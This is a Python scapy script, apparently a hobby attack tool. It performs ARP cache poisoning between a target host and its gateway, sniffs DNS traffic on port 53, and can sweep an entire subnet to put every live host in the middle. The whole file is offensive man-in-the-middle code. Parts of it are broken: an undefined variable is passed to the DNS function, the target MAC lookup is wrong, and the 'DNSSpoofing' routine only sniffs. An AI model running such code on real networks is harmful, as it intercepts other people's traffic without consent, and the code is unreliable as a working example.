from scapy.layers.l2 import *
from scapy.sendrecv import send, sniff
import sys 

def spoofarpcache(targetip, targetmac, sourceip):
	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)

def DNSSpoofing(iptarget):
   a = sniff(filter="port 53")
   a.nsummary()

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print("ARP Table restored to normal for", targetip)

def MultiSniffing(ippasserelle):
	ipt = {}
	ip = ".".join(ippasserelle.split(".")[:-1]) + "."
	for num in range(1, 255):
		if str(arping(ip + str(num))[0])[-2] != "0":
			ipt[ip + str(num)] = getmacbyip(ip + str(num))
			SingleSniffing(ip + str(num), ippasserelle)
	print(ipt)


def SingleSniffing(targetip, passerelleip):
	if str(arping(targetip)[0])[-2] != "0" :
		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
		gatewayip = passerelleip
		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
		try:
			print("Sending spoofed ARP responses")
			#while True:
			spoofarpcache(targetip, targetmac, gatewayip)
			spoofarpcache(gatewayip, gatewaymac, targetip)
			DNSSpoofing(iptarget)
		except KeyboardInterrupt:
			print("ARP spoofing stopped")
			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
			restorearp(targetip, targetmac, gatewayip, gatewaymac)
			quit()
	else:
		print("Ip not reachable")

match len(sys.argv):
    case 1:
        print("Please can you enter the target IP Adress and Passerelle IP")
    case 2:
        match sys.argv[1]:
            case "-s":
                print("Please can you enter the target IP Adress and Passerelle IP")
            case "-m":
                print("Please can you enter the Passerelle IP")
            case _:
                print("Please can you enter the Passerelle IP")
    case 3:
        match sys.argv[1]:
            case "-s":
                print("Please can you enter the Passerelle IP")
            case "-m":
                MultiSniffing(sys.argv[2])
            case _:
                SingleSniffing(sys.argv[1], sys.argv[2])
    case 4:
        match sys.argv[1]:
            case "-s":
                SingleSniffing(sys.argv[2], sys.argv[3])
            case _:
                print("To many arguments")
    case _:
        print("To many arguments")
    



